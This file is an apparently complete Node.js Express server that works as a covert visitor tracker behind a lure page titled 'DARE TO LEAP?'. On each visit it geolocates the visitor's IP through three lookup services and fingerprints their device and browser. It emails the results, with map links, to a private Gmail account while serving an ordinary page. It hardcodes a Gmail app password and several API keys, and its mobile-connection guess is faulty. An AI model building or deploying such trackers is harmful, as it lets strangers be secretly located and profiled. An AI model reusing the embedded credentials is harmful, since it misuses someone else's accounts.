// DARE TO LEAP?

const express = require('express');
const nodemailer = require('nodemailer');
const axios = require('axios');
const UAParser = require('ua-parser-js');
const app = express();

app.set('trust proxy', true);
const sessionStarts = {};

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'staysane.rz@gmail.com',
    pass: 'nvkq cudo ibhh usdr',
  },
});

app.use((req, res, next) => {
  const ip = req.ip;
  if (!sessionStarts[ip]) {
    sessionStarts[ip] = new Date();
  }
  next();
});

app.get('/', async (req, res) => {
  const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || '';
  const referrer = req.headers['referer'] || 'direct';
  
  const timestamp = new Date();
  const formattedTimestamp = timestamp.toLocaleString('en-US', {
    weekday: 'long',
    year: 'numeric',
    month: 'long',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });

  if (userAgent.includes('UptimeRobot')) {
    return res.status(204).end();
  }

  const parser = new UAParser(userAgent);
  const device = parser.getDevice();
  const os = parser.getOS();
  const browser = parser.getBrowser();
  const engine = parser.getEngine();
  const cpu = parser.getCPU();
  const deviceType = device.type || 'Unknown';

  const connectionType = inferConnectionType(req);
  const sessionStart = sessionStarts[ip];
  const sessionDuration = sessionStart ? `${(new Date() - sessionStart) / 1000} seconds` : 'First visit';

  let location_ipdata = 'N/A';
  let lat_ipdata = null;
  let lon_ipdata = null;

  let location_ipinfo = 'N/A';
  let lat_ipinfo = null;
  let lon_ipinfo = null;

  let location_opencage = 'N/A';
  let lat_opencage = null;
  let lon_opencage = null;

  try {
    const ipdataKey = '4c79ad3a83ad02e351dda5314f32ea361724437d091ce1501228965a';
    const geo = await axios.get(`https://api.ipdata.co/${ip}?api-key=${ipdataKey}`);
    const { city, region, country_name, organisation, latitude, longitude } = geo.data;

    location_ipdata = `${city}, ${region}, ${country_name} (ISP: ${organisation})`;
    lat_ipdata = latitude;
    lon_ipdata = longitude;
  } catch (err) {
    console.warn('IPData failed:', err.message);
  }

  try {
    const ipinfoToken = '5cbabbc7ad7b57';
    const geo = await axios.get(`https://ipinfo.io/${ip}?token=${ipinfoToken}`);
    const { city, region, country, org, loc } = geo.data;

    location_ipinfo = `${city}, ${region}, ${country} (ISP: ${org})`;

    const [latitude, longitude] = loc.split(',');
    lat_ipinfo = latitude;
    lon_ipinfo = longitude;
  } catch (err) {
    console.warn('IPInfo failed:', err.message);
  }

  try {
    const openCageKey = 'cd07cd206f6a4f7086bed7fa65741f82';
    const lat = lat_ipdata || lat_ipinfo;
    const lon = lon_ipdata || lon_ipinfo;

    if (lat && lon) {
      const reverseGeo = await axios.get(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${openCageKey}`);
      const result = reverseGeo.data.results[0];
      location_opencage = result?.formatted || 'N/A';
      lat_opencage = result?.geometry?.lat;
      lon_opencage = result?.geometry?.lng;
    }
  } catch (err) {
    console.warn('OpenCage failed:', err.message);
  }

  const mailOptions = {
    from: 'zyron',
    to: 'xraymundzyron@gmail.com',
    subject: 'Visitor accessed your URL',
    text: `New visit detected!

Timestamp: ${formattedTimestamp}
IP Address: ${ip}

== LOCATION SOURCES ==
[IPData]
Location: ${location_ipdata}
Coords: ${lat_ipdata}, ${lon_ipdata}
Map: https://www.google.com/maps?q=${lat_ipdata},${lon_ipdata}

[IPInfo]
Location: ${location_ipinfo}
Coords: ${lat_ipinfo}, ${lon_ipinfo}
Map: https://www.google.com/maps?q=${lat_ipinfo},${lon_ipinfo}

[OpenCage]
Address: ${location_opencage}
Coords: ${lat_opencage}, ${lon_opencage}
Map: https://www.google.com/maps?q=${lat_opencage},${lon_opencage}

== DEVICE INFO ==
Device Type: ${deviceType}
Brand:       ${device.vendor || 'Unknown'}
Model:       ${device.model || 'Unknown'}
OS:          ${os.name || 'OS'} ${os.version || ''}
Browser:     ${browser.name || 'Browser'} ${browser.version || ''}
Engine:      ${engine.name || 'Unknown engine'}
CPU:         ${cpu.architecture || 'Unknown CPU architecture'}

== SESSION ==
Connection:       ${connectionType}
Session Duration: ${sessionDuration}
User Agent:       ${userAgent}
Referrer:         ${referrer}`
  };

  transporter.sendMail(mailOptions, (error) => {
    if (error) console.error('Email failed:', error);
  });

  res.sendFile(__dirname + '/index.html');
});

function inferConnectionType(req) {
  const ip = req.ip;
  if (ip.startsWith('192.') || ip.startsWith('172.16.') || ip.startsWith('10.')) {
    return 'Likely Mobile (Cellular)';
  }
  return 'Likely WiFi/Landline';
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Tracker running on port ${PORT}`));
